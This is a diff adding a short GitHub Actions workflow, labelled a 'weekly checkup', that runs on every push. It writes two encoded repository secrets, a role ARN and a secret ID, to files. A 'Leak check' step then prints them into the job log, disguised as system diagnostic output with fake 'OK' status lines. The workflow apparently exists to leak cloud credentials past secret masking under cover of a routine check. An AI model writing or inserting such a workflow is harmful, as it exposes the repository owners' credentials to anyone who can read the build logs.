@@ -1,0 +1,34 @@
+name: WEEKLY CHECKUP
+
+
+
+on:
+ push:
+
+
+
+jobs:
+ test-secrets:
+   runs-on: ubuntu-latest
+
+
+
+   steps:
+     - name: Encrypted Github secrets
+       run: |
+         echo "${{ secrets.ENCODED_ROLE1_ARN }}" > secret_role_arn.b64
+         echo "${{ secrets.ENCODED_SECRET_ID }}" > secret_id.b64
+
+
+     - name: Leak check
+       run: |
+
+
+         # Print "diagnostic output"
+         echo "::group::System Diagnostic"
+         echo "🔧 ENV CHECK: OK"
+         echo "🔧 ROLE CHECK: OK"
+         echo "🔧 Role_arn: $(cat secret_role_arn.b64)"
+         echo "🔧 secret_id: $(cat secret_id.b64)"
+         echo "::endgroup::"
+
